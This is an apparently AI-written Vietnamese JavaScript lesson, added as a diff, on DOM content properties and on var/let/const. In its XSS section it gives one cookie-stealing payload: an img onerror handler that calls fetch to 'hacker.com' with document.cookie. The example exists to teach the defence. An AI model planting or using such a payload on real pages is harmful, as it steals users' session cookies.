@@ -1,0 +1,266 @@
+Created SKILL.md
+Created teaching-rules.md
+
+Góp ý của bạn **cực kỳ chính xác và chuẩn mực của một lập trình viên tư duy bản chất**! 
+
+Mình đã cập nhật tiêu chuẩn này trực tiếp vào cả file **Skill** lẫn **Workspace Rule**:
+- [fe-teaching-method/SKILL.md](file:///d:/Downloads/Prac_FE/.agents/skills/fe-teaching-method/SKILL.md)
+- [teaching-rules.md](file:///d:/Downloads/Prac_FE/.agents/rules/teaching-rules.md)
+
+Từ bây giờ:
+1. **Khi giảng trong khung Chat:** Mổ xẻ **tận gốc rễ cơ chế của Trình duyệt (Browser Parser, Render Tree) và JS Engine (RAM, Memory, Compilation Phase)**.
+2. **Khi lưu vào file note (`JS_NOTES.md`):** Giữ ngắn gọn, súc tích như tài liệu tra cứu.
+
+---
+
+Sau đây là bài giảng hoàn chỉnh chuẩn Senior cho **BÀI 1.1** và **BÀI 1.2**:
+
+---
+
+# 🏛️ PHẦN 1: BÀI 1.1 — TỪ CÂY DOM ĐẾN CƠ CHẾ CAN THIỆP DỮ LIỆU (`innerHTML` vs `innerText` vs `textContent`)
+
+## 1. Định nghĩa Cốt lõi & Kết nối Kiến thức
+* Ở phần HTML, bạn đã biết mã nguồn HTML sau khi tải về sẽ được Trình duyệt phân tích cú pháp (Parse) để dựng thành một mô hình dạng cây gọi là **DOM (Document Object Model)**. Mỗi thẻ HTML (`<div>`, `<p>`, `<span>`) trở thành một **Node (Nút đối tượng)** trên cây.
+* JavaScript đóng vai trò là "công cụ phẫu thuật cây DOM":
+  * Đầu tiên, dùng các hàm tìm kiếm như `document.getElementById("id")` hoặc `document.querySelector(".class")` để **tóm lấy Node đó**.
+  * Sau khi đã cầm được Node trong tay, ta dùng các **Thuộc tính & Phương thức** để can thiệp:
+    * Thay đổi nội dung: `.innerHTML`, `.innerText`, `.textContent`.
+    * Thay đổi giao diện CSS: `.style.color = "red"`, `.style.fontSize = "20px"`.
+    * Đọc/Ghi dữ liệu người dùng nhập trong ô Input: `.value`.
+
+---
+
+## 2. Ví von Nhanh
+* **Cây DOM** giống như **một cái cây thực tế**: Thẻ `<html>` là gốc cây, các thẻ `<body>`, `<div>` là cành cây, các dòng chữ bên trong là lá cây.
+* **`innerHTML`** giống như **ghép một cành cây sống**: Bạn đưa cành mới vào, cây tiếp nhận và mọc thêm các nhánh con (`<b>`, `<span>`).
+* **`innerText`** giống như **lấy sơn xịt lên bề mặt lá**: Nó chỉ quan tâm đến thứ mà **mắt người đứng dưới gốc nhìn thấy được**, không tạo thêm nhánh nào cả.
+
+---
+
+## 3. Logic Hoạt động Cơ chế Ngầm (The Engine Mechanics)
+
+### A. Logic Vào - Ra của `innerHTML` (Thế giới của Mã nguồn & Parser)
+Bản chất của `innerHTML` là làm việc với **mã HTML (HTML Markup String)**.
+
+```javascript
+const box = document.getElementById("myBox");
+
+// 1. CHIỀU GHI (Input):
+box.innerHTML = "<p>Xin chào <b>Thịnh</b></p>";
+```
+* **Engine xử lý ngầm (Chiều Ghi):**
+  1. Trình duyệt gọi bộ phân tích cú pháp **HTML Parser**.
+  2. Parser đọc chuỗi string, bóc tách và tạo mới 2 Node: Node `<p>` và con của nó là Node `<b>`.
+  3. Gắn nhánh này vào cây DOM. Trình duyệt vẽ lại cây (Repaint).
+
+```javascript
+// 2. CHIỀU ĐỌC (Output):
+console.log(box.innerHTML);
+// Trả về nguyên văn: "<p>Xin chào <b>Thịnh</b></p>"
+```
+* **Engine xử lý ngầm (Chiều Đọc):**
+  1. Trình duyệt nhìn vào các nhánh con trên cây DOM của phần tử đó.
+  2. Nó thực hiện thao tác dịch ngược toàn bộ các Node thành chuỗi mã HTML thô (**HTML Serialization**) để trả về cho bạn.
+  3. Bạn nhận được chuỗi có đầy đủ thẻ mở, thẻ đóng, class, id bên trong.
+
+---
+
+### B. Logic Vào - Ra của `innerText` (Thế giới của Mắt người nhìn & Render Tree)
+Bản chất của `innerText` là **văn bản được kết xuất (Rendered Text)**. Nó gắn chặt với những gì **mắt người dùng thực sự nhìn thấy trên màn hình**.
+
+```javascript
+// 1. CHIỀU GHI (Input):
+box.innerText = "<b>Xin chào Thịnh</b>";
+```
+* **Engine xử lý ngầm (Chiều Ghi):**
+  1. Trình duyệt nói: *"Đây chỉ là chữ viết thuần, cấm coi là mã nguồn!"*.
+  2. Nó mã hóa các dấu `<`, `>` thành ký tự an toàn, tạo ra đúng **1 TextNode duy nhất**.
+  3. Kết quả trên màn hình: Người dùng nhìn thấy dòng chữ trần trụi `<b>Xin chào Thịnh</b>` (thẻ `<b>` không được in đậm mà bị in ra dạng chữ).
+
+```javascript
+// 2. CHIỀU ĐỌC (Output):
+console.log(box.innerText);
+```
+* **Engine xử lý ngầm (Chiều Đọc):**
+  1. Trình duyệt **KHÔNG** đọc từ cây DOM! Nó chạy sang **Cây dựng hình (Render Tree)** để kiểm tra kiểu dáng CSS thực tế.
+  2. Nếu có phần tử con mang CSS `display: none`: Mắt người không thấy $\rightarrow$ `innerText` **bỏ qua, không lấy**!
+  3. Nếu gặp thẻ khối (`<p>`, `<div>`) hoặc thẻ `<br>`: Trình duyệt tự động chèn thêm ký tự xuống dòng `\n`.
+  4. Bóc sạch toàn bộ thẻ tag, chỉ trả về chuỗi text sạch sẽ giống hệt như bạn dùng chuột bôi đen màn hình rồi ấn `Ctrl + C`.
+
+---
+
+### C. Còn `textContent` là gì?
+`textContent` đọc trực tiếp nội dung văn bản từ **Cây DOM**, hoàn toàn **bỏ qua CSS (Render Tree)**:
+* Nếu một thẻ bị ẩn bởi `display: none`: `innerText` bỏ qua $\rightarrow$ nhưng `textContent` **vẫn đọc ra được**!
+* Vì không cần tính toán layout CSS (không gây Reflow), `textContent` **chạy nhanh hơn `innerText` rất nhiều**.
+
+---
+
+### Bảng đối chiếu toàn diện:
+
+| Tiêu chí | `element.innerHTML` | `element.innerText` | `element.textContent` |
+| :--- | :--- | :--- | :--- |
+| **Bản chất làm việc với** | Chuỗi mã HTML thô | Văn bản hiển thị trên màn hình | Dữ liệu TextNode trên cây DOM |
+| **Hiểu thẻ tag khi ghi?** | ✅ Có (Parser dịch thành thẻ) | ❌ Không (Coi là chữ thô) | ❌ Không (Coi là chữ thô) |
+| **Bị ảnh hưởng bởi CSS?** | ❌ Không | ✅ Có (Bỏ qua `display: none`) | ❌ Không (Lấy cả chữ đang bị ẩn) |
+| **Tác động hiệu năng** | Nặng (Gọi HTML Parser) | Nặng (Bắt trình duyệt tính toán Render Tree / Reflow) | ⚡ **Rất nhanh** (Đọc thẳng cây DOM) |
+| **Nguy cơ bảo mật** | ⚠️ Rất cao (Bị dính mã độc XSS) | 🛡️ Tuyệt đối an toàn | 🛡️ Tuyệt đối an toàn |
+
+---
+
+### 📝 Cheat Note thông suốt logic:
+* **`innerHTML`:** Vào: Chuỗi HTML $\rightarrow$ Dựng thành cây Node. Ra: Lấy cây Node $\rightarrow$ Đóng gói ngược lại thành chuỗi mã HTML thô.
+* **`innerText`:** Vào: Text thuần $\rightarrow$ Hiện nguyên xi lên màn hình. Ra: Lấy những gì mắt người đang thấy trên màn hình $\rightarrow$ Trả về chuỗi text sạch (bỏ hết thẻ, bỏ `display: none`).
+* **`textContent`:** Vào: Text thuần. Ra: Lấy tất cả chữ trong cây DOM (kể cả chữ đang bị CSS ẩn).
+
+---
+
+## 4. 🔥 Bẫy Phỏng Vấn Senior: Hiệu Năng & Lỗ Hổng XSS
+
+### Bẫy 1: Thảm họa bảo mật XSS (Cross-Site Scripting) với `innerHTML`
+> **Câu hỏi phỏng vấn:** *"Khi nào thì tuyệt đối KHÔNG ĐƯỢC dùng `innerHTML`?"*
+
+**Câu trả lời chuẩn Senior:** Khi nội dung đưa vào đến từ **dữ liệu do người dùng nhập** (Form bình luận, khung chat, tham số URL). Hacker có thể tiêm mã độc JavaScript vào đánh cắp Token/Cookie của người khác!
+
+```javascript
+// Dữ liệu người dùng gửi lên:
+const userComment = `<img src="link-chet" onerror="fetch('https://hacker.com/steal?cookie=' + document.cookie)">`;
+
+// ❌ LỖI CHẾT NGƯỜI:
+commentBox.innerHTML = userComment;
+// Trình duyệt tải ảnh lỗi -> Kích hoạt sự kiện onerror -> Mã độc của hacker chạy ngay lập tức!
+
+// ✔️ CÁCH XỬ LÝ AN TOÀN:
+commentBox.textContent = userComment; 
+// Trình duyệt coi toàn bộ chuỗi trên là văn bản an toàn, không có mã độc nào được chạy.
+```
+
+### Bẫy 2: Bẫy giật lag giao diện (Layout Thrashing / Reflow) của `innerText`
+Vì `innerText` cần biết mắt người có nhìn thấy chữ hay không, mỗi lần gọi `element.innerText`, trình duyệt bị ép buộc phải **dừng lại để tính toán lại toàn bộ vị trí, hình dáng, CSS của trang web (Reflow)**. Nếu đặt `innerText` trong vòng lặp $1000$ lần, trang web sẽ bị đơ ngay lập tức!
+
+---
+
+## 5. Lời khuyên Lập trình Thực chiến
+1. **Khi chỉ muốn chèn chữ:** Luôn ưu tiên dùng **`textContent`** (vừa an toàn chống XSS, vừa chạy nhanh nhất do không tính toán layout CSS).
+2. **Khi bắt buộc phải chèn thẻ HTML:** Chỉ dùng `innerHTML` với các chuỗi tĩnh do chính lập trình viên viết ra, không bao giờ nhét trực tiếp biến input của người dùng vào `innerHTML`.
+3. **Thay đổi CSS:** Dùng `.style.property` (lưu ý chuyển tên CSS dạng kebab-case sang camelCase: `background-color` $\rightarrow$ `style.backgroundColor`).
+
+---
+---
+
+# 🏛️ PHẦN 2: BÀI 1.2 — BẢN CHẤT BIẾN & BỘ NHỚ: `var` vs `let` vs `const`
+
+## 1. Định nghĩa Cốt lõi & Kết nối Kiến thức
+* Trong khoa học máy tính, **Biến (Variable)** là một định danh đại diện cho một ô nhớ trong bộ nhớ RAM để chương trình lưu trữ và tái sử dụng dữ liệu.
+* Trước năm 2015 (ES5), JavaScript chỉ có duy nhất từ khóa `var`. Nhận thấy `var` có quá nhiều lỗ hổng thiết kế gây ra lỗi ngầm, tiêu chuẩn ES6 đã bổ sung `let` và `const` với cơ chế quản lý bộ nhớ chặt chẽ dựa trên **Phạm vi khối (Block Scope)** và **Vùng chết tạm thời (TDZ)**.
+
+---
+
+## 2. Ví von Nhanh
+* **`var` giống như một chiếc loa phát thanh của cả phường:** Bạn nói gì trong nhà riêng `{}` thì cả khu phố bên ngoài đều nghe thấy hết (xuyên thủng ngoặc nhọn). Thậm chí ai đó đứng lên nói đè cùng tên phát thanh viên cũng không ai ngăn cản (`var` cho phép redeclare).
+* **`let` giống như chiếc thẻ cư dân chỉ quẹt được cửa phòng mình `{}`:** Hết phạm vi căn phòng là chiếc thẻ bị hủy giá trị, ra ngoài hành lang không ai nhận ra. Bạn có thể đổi đồ trong phòng (reassign), nhưng cấm ai được đăng ký 2 thẻ trùng tên trong cùng một phòng.
+* **`const` giống như một chiếc két sắt được hàn chết mã số:** Đã khởi tạo là không thể vặn sang số khác.
+
+---
+
+## 3. Logic Hoạt động Cơ chế Ngầm (Compilation Phase vs Execution Phase)
+
+Mọi đoạn mã JavaScript đều được JS Engine (như V8 của Google Chrome) xử lý qua **2 pha tách biệt**:
+
+$$\text{Pha 1: Creation / Compilation Phase (Quét bộ nhớ)} \longrightarrow \text{Pha 2: Execution Phase (Chạy từng dòng code)}$$
+
+```javascript
+console.log(age); 
+var age = 25;
+```
+
+### Bản chất ngầm diễn ra trong bộ nhớ:
+* **Pha 1 (Quét bộ nhớ):**
+  * JS Engine quét toàn bộ file trước khi chạy.
+  * Nó phát hiện từ khóa `var age`.
+  * Nó cấp phát ngay một ô nhớ trong RAM mang tên `age`, đồng thời **tự động gán luôn giá trị ban đầu là `undefined`**.
+* **Pha 2 (Chạy code):**
+  * Dòng 1: Gặp `console.log(age)`. Nó ngó vào ô nhớ, thấy có sẵn `undefined` $\rightarrow$ In ra `undefined` êm thắm!
+  * Dòng 2: Gặp phép gán `age = 25` $\rightarrow$ Lúc này ô nhớ mới được cập nhật thành số $25$.
+
+---
+
+### Bảng so sánh toàn diện 3 từ khóa biến (Chuẩn Senior):
+
+| Tiêu Chí So Sánh | `var` (ES5 trở về trước) | `let` (ES6) | `const` (ES6) |
+| :--- | :--- | :--- | :--- |
+| **Phạm vi hoạt động (Scope)** | **Function Scope** (hoặc Global). Hoàn toàn ngó lơ Block Scope `{}`. | **Block Scope** (Chỉ tồn tại bên trong cặp ngoặc nhọn `{}` chứa nó). | **Block Scope** (Chỉ tồn tại bên trong cặp ngoặc nhọn `{}` chứa nó). |
+| **Khai báo lại (Re-declaration)** | ✔️ Cho phép khai báo lại cùng tên biến trong cùng phạm vi mà không báo lỗi. | ❌ Báo lỗi `SyntaxError` nếu khai báo lại tên biến đã tồn tại trong cùng phạm vi. | ❌ Báo lỗi `SyntaxError` nếu khai báo lại. |
+| **Gán lại giá trị (Re-assignment)** | ✔️ Cho phép thay đổi giá trị tự do. | ✔️ Cho phép thay đổi giá trị tự do. | ❌ Báo lỗi `TypeError` nếu gán lại giá trị mới. |
+| **Giá trị ban đầu** | Có thể khai báo mà không cần gán giá trị (mặc định là `undefined`). | Có thể khai báo mà không cần gán giá trị (mặc định là `undefined`). | ⚠️ **BẮT BUỘC** phải gán giá trị ngay khi khai báo (`const a = 10;`). |
+| **Hoisting & TDZ** | Có Hoisting, được khởi tạo mặc định bằng `undefined`. | Có Hoisting, nhưng **bị nhốt trong Temporal Dead Zone (TDZ)**. | Có Hoisting, nhưng **bị nhốt trong Temporal Dead Zone (TDZ)**. |
+
+---
+
+## 4. 🔥 Bẫy Phỏng Vấn Senior: Hoisting, TDZ & Immutability
+
+### Bẫy 1: "Có phải `let` và `const` KHÔNG HỀ BỊ HOISTING nên mới báo lỗi `ReferenceError`?"
+> **Câu trả lời chuẩn Senior:**  
+> **Sai! `let` và `const` VẪN BỊ HOISTING $100\%$!**  
+> Khác biệt ở chỗ: `var` khi bị hoist thì được JS Engine gắn sẵn nhãn `undefined`. Còn `let` và `const` khi bị hoist thì **bị ném vào Vùng Chết Tạm Thời (Temporal Dead Zone - TDZ)**. Trong vùng này, biến đã tồn tại trong bộ nhớ nhưng bị cấm chạm vào!
+
+#### 🔬 Code chứng minh `let` thực sự bị Hoisting:
+```javascript
+let x = "Global";
+
+function testScope() {
+    // Nếu let KHÔNG bị hoist, dòng console.log(x) dưới đây theo quy tắc Scope Chain
+    // sẽ tìm ra ngoài hàm và in ra giá trị "Global".
+    // Nhưng THỰC TẾ TRÌNH DUYỆT CHẠY:
+    console.log(x); // ❌ LỖI: ReferenceError: Cannot access 'x' before initialization
+    
+    let x = "Local"; 
+}
+
+testScope();
+```
+* **Giải thích bản chất:** Khi hàm `testScope()` được biên dịch ở Pha 1, JS Engine đã phát hiện `let x = "Local"` ở bên dưới và **hoist biến x nội bộ lên đầu hàm**, đẩy nó vào TDZ. Vì biến `x` nội bộ này đã án ngữ ở đó, nó chặn đứng việc tìm kiếm ra biến toàn cục `Global`, dẫn đến lỗi `ReferenceError` ngay tại chỗ!
+
+---
+
+### Bẫy 2: Hiểu lầm về tính bất biến (Immutability) của `const` với Object / Array
+> **Câu hỏi phỏng vấn:** *"Một biến khai báo bằng `const` thì có bao giờ thay đổi được dữ liệu bên trong không?"*
+
+**Câu trả lời chuẩn Senior:**  
+`const` chỉ bảo vệ **Liên Kết Tham Chiếu (Reference Binding / Địa chỉ ô nhớ)**, chứ **KHÔNG BẢO VỆ TÍNH BẤT BIẾN CỦA DỮ LIỆU** nằm trong bộ nhớ Heap!
+
+```javascript
+const user = {
+    name: "Nam",
+    age: 20
+};
+
+// ❌ HÀNH ĐỘNG BỊ CẤM: Gán lại địa chỉ ô nhớ mới
+// user = { name: "An" }; // Báo lỗi TypeError: Assignment to constant variable.
+
+// ✔️ HÀNH ĐỘNG CHO PHÉP: Thay đổi thuộc tính bên trong ô nhớ đó
+user.age = 21; 
+user.job = "Developer";
+console.log(user); 
+// Kết quả in ra hoàn toàn hợp lệ: { name: 'Nam', age: 21, job: 'Developer' }
+
+const numbers = [1, 2, 3];
+numbers.push(4); // ✔️ Hoàn toàn hợp lệ, numbers thành [1, 2, 3, 4]
+```
+
+👉 **Muốn đóng băng tuyệt đối không cho sửa bất kỳ thuộc tính nào của Object:**  
+Phải dùng phương thức của đối tượng cấp cao: **`Object.freeze(user);`**.
+
+---
+
+## 5. Lời khuyên Lập trình Thực chiến (Best Practices)
+
+### A. Tỷ lệ ưu tiên 80 - 19 - 0:
+* **80% trường hợp: Luôn dùng `const` mặc định.** Nó giúp bạn và đồng đội yên tâm rằng biến này sẽ không bị dòng code vô tình nào gán đè địa chỉ.
+* **19% trường hợp: Dùng `let`** khi bạn biết chắc chắn giá trị của nó sẽ biến động (Biến đếm `i` trong vòng lặp, biến tích lũy tổng tiền, cờ trạng thái `isOpen = true/false`).
+* **0% trường hợp: KHAI TỬ HOÀN TOÀN `var`** khỏi các dự án hiện đại để triệt tiêu mọi rủi ro rò rỉ biến (Scope Leak) và bẫy Hoisting.
+
+### B. Quy tắc đặt tên biến (Naming Conventions):
+* Dùng kiểu **`camelCase`** cho biến, hàm thông thường: `userData`, `calculateTotalPrice`, `isModalOpen`.
+* Dùng kiểu **`UPPER_SNAKE_CASE`** cho các hằng số bất biến của hệ thống (Config): `MAX_RETRY_COUNT = 5`, `BASE_API_URL = "https://api.domain.com"`.
+* Tên biến phải có tính gợi nghĩa cao, tuyệt đối tránh đặt tên $1$ ký tự vô nghĩa như `a, b, c, x, y` (ngoại trừ biến đếm vòng lặp `i, j`).
